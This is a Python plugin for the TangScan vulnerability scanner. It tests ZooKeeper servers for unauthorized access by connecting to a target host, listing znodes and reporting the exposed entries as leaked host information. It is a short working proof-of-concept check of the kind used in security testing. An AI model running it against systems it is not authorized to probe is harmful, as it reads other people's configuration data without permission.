# -*- coding: utf-8 -*-
"""
Copyright (c) 2013-2014 TangScan developers (http://www.wooyun.org/)
author: PyNerd <8517172@qq.com>
"""

from __future__ import print_function, absolute_import

from kazoo.client import KazooClient

from modules.exploit import TSExploit

import datetime

__all__ = ['TangScan']


class TangScan(TSExploit):
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "zookeeper 未授权访问",
            "product": "zookeeper",
            "product_version": "all",
            "desc": """
                zookeeper 存在未授权访问, 可导致敏感数据泄漏
            """,
            "license": self.license.TS,
            "author": "PyNerd",
            "type": self.type.misconfiguration,
            "severity": self.severity.medium,
            "privileged": False,
            "disclosure_date": datetime.datetime.now().strftime("%Y-%m-%d"), 
            "create_date": datetime.datetime.now().strftime("%Y-%m-%d") 
        }

        self.register_option({
            "host": {
                "default": "",
                "required": True,
                "choices": [],
                "convert": self.convert.str_field,
                "desc": """
                    目标主机
                """
            },
            "port": {
                "default": 2181,
                "required": False,
                "choices": [],
                "convert": self.convert.int_field,
                "desc": """
                    目标端口
                """
            }
        })

        self.register_result({
            "status": False,
            "data": {
                "db_info": {
                    "db_name": ""
                }
            },
            "description": "",
            "error": "",
        })

    def verify(self):
        host = self.option.host
        port = self.option.port
        thost = host + ":" + str(port)
        conn = KazooClient(hosts =thost)
        conn.start()
        children = conn.get_children('/')
        for i in children:
                item =  conn.get_children('/' + i)
                for j in item:
                    self.result.status = True
                    self.result.result = j
                    self.result.description = "目标 {host} 的 zookeeper 存在未授权访问%s主机信息:%s{sysinfo}".format(host=self.option.host,sysinfo=j) % ('\n','\n')

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    from modules.main import main
    main(TangScan())
